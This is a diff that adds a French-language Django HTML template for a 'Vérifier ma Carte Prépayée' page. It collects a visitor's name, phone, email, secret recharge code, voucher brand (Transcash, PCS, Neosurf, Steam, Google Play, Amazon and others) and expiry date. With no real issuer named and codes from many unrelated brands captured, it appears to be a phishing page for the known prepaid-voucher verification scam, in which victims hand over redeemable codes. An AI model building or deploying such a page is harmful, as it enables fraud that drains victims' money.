@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérifier ma Carte Prépayée</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            background: url('https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?w=1920') center/cover no-repeat fixed;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .form-header {
+            text-align: center;
+            color: white;
+            margin-bottom: 50px;
+            animation: fadeInDown 0.8s ease;
+        }
+
+        .form-header h1 {
+            font-size: 2.8em;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7);
+            margin-bottom: 10px;
+        }
+
+        .form-header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+            font-style: italic;
+        }
+
+        .recharge-form {
+            animation: fadeInUp 1s ease;
+        }
+
+        .form-question {
+            margin-bottom: 35px;
+        }
+
+        .question-label {
+            color: white;
+            font-size: 1.1em;
+            margin-bottom: 15px;
+            display: block;
+            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.8);
+        }
+
+        .question-number {
+            color: #ff6b6b;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .question-subtitle {
+            display: block;
+            font-size: 0.9em;
+            font-style: italic;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            background: rgba(0, 0, 0, 0.85);
+            box-shadow: 0 0 15px rgba(255, 107, 107, 0.3);
+        }
+
+        .form-select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 20px;
+            padding-right: 45px;
+        }
+
+        .form-select option {
+            background: #1a1a1a;
+            color: white;
+            padding: 10px;
+        }
+
+        .double-input {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 20px;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+
+        .toggle-password:hover {
+            opacity: 1;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .checkbox-input {
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+            accent-color: #ff6b6b;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .checkbox-label {
+            color: white;
+            font-size: 0.95em;
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        .checkbox-label a {
+            color: #ff6b6b;
+            text-decoration: underline;
+        }
+
+        .checkbox-label a:hover {
+            color: #ff8787;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 30px;
+            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.6);
+        }
+
+        .btn-submit:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .branding {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .branding-text {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .branding-logo {
+            width: 24px;
+            height: 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 5px;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 600px) {
+            .form-header h1 {
+                font-size: 2em;
+            }
+
+            .double-input {
+                grid-template-columns: 1fr;
+            }
+
+            .container {
+                padding: 30px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-header">
+            <h1>VÉRIFIER MA CARTE PRÉPAYÉE</h1>
+            <p>Check my prepaid card</p>
+        </div>
+
+        <form class="recharge-form" method="POST" action="{% url 'submit-recharge' %}">
+            {% csrf_token %}
+
+            <!-- 1. Nom et Prénom -->
+            <div class="form-question">
+                <label class="question-label">
+                    <span class="question-number">1.</span> Nom complet : *
+                    <span class="question-subtitle">Full Name</span>
+                </label>
+                <div class="double-input">
+                    <input type="text" name="first_name" class="form-input" placeholder="Prénom" required>
+                    <input type="text" name="last_name" class="form-input" placeholder="Nom" required>
+                </div>
+            </div>
+
+            <!-- 2. Téléphone -->
+            <div class="form-question">
+                <label class="question-label">
+                    <span class="question-number">2.</span> Numéro de téléphone : *
+                    <span class="question-subtitle">Phone Number</span>
+                </label>
+                <input type="tel" name="phone" class="form-input" placeholder="+33 6 12 34 56 78" required>
+            </div>
+
+            <!-- 3. Email -->
+            <div class="form-question">
+                <label class="question-label">
+                    <span class="question-number">3.</span> Adresse e-mail : *
+                    <span class="question-subtitle">Email Address</span>
+                </label>
+                <input type="email" name="email" class="form-input" placeholder="votre@email.com" required>
+            </div>
+
+            <!-- 4. Code de recharge -->
+            <div class="form-question">
+                <label class="question-label">
+                    <span class="question-number">4.</span> Code de recharge : *
+                    <span class="question-subtitle">Recharge Code</span>
+                </label>
+                <div class="password-wrapper">
+                    <input type="password" name="recharge_code" id="rechargeCode" class="form-input" placeholder="Entrez votre code" required>
+                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+                </div>
+                <div class="checkbox-group" style="margin-top: 12px;">
+                    <input type="checkbox" id="showCode" class="checkbox-input" onchange="togglePasswordCheckbox()">
+                    <label for="showCode" class="checkbox-label">Afficher le code de recharge</label>
+                </div>
+            </div>
+
+            <!-- 5. Mode de recharge -->
+            <div class="form-question">
+                <label class="question-label">
+                    <span class="question-number">5.</span> Mode de recharge : *
+                    <span class="question-subtitle">Recharge Type</span>
+                </label>
+                <select name="recharge_type" class="form-select" required>
+                    <option value="">Veuillez sélectionner</option>
+                    <option value="transcash">Transcash</option>
+                    <option value="pcs">PCS Mastercard</option>
+                    <option value="neosurf">Néosurf</option>
+                    <option value="steam">Steam</option>
+                    <option value="google_play">Google Play</option>
+                    <option value="itunes">iTunes</option>
+                    <option value="paysafecard">Paysafecard</option>
+                    <option value="amazon">Amazon</option>
+                </select>
+            </div>
+
+            <!-- 6. Date d'expiration -->
+            <div class="form-question">
+                <label class="question-label">
+                    <span class="question-number">6.</span> Date d'expiration du code : *
+                    <span class="question-subtitle">Expiration Date</span>
+                </label>
+                <input type="date" name="expiration_date" class="form-input" required>
+            </div>
+
+            <!-- 7. Conditions générales -->
+            <div class="form-question">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" name="terms" class="checkbox-input" required>
+                    <label for="terms" class="checkbox-label">
+                        J'accepte les <a href="#" target="_blank">termes et conditions</a> du site *
+                        <span class="question-subtitle">I agree to the terms and conditions</span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Bouton de soumission -->
+            <button type="submit" class="btn-submit" id="submitBtn" disabled>
+                Vérifier ma carte
+            </button>
+        </form>
+
+        <div class="branding">
+            <div class="branding-text">
+                <div class="branding-logo"></div>
+                Créé avec votre plateforme
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Toggle password visibility avec le bouton œil
+        function togglePassword() {
+            const input = document.getElementById('rechargeCode');
+            const btn = event.target;
+            if (input.type === 'password') {
+                input.type = 'text';
+                btn.textContent = '🙈';
+            } else {
+                input.type = 'password';
+                btn.textContent = '👁️';
+            }
+        }
+
+        // Toggle password avec la checkbox
+        function togglePasswordCheckbox() {
+            const input = document.getElementById('rechargeCode');
+            const checkbox = document.getElementById('showCode');
+            input.type = checkbox.checked ? 'text' : 'password';
+        }
+
+        // Activer le bouton uniquement si les conditions sont acceptées
+        const termsCheckbox = document.getElementById('terms');
+        const submitBtn = document.getElementById('submitBtn');
+
+        termsCheckbox.addEventListener('change', function() {
+            submitBtn.disabled = !this.checked;
+        });
+
+        // Validation du formulaire
+        document.querySelector('.recharge-form').addEventListener('submit', function(e) {
+            if (!termsCheckbox.checked) {
+                e.preventDefault();
+                alert('Veuillez accepter les termes et conditions');
+            }
+        });
+    </script>
+</body>
+</html>
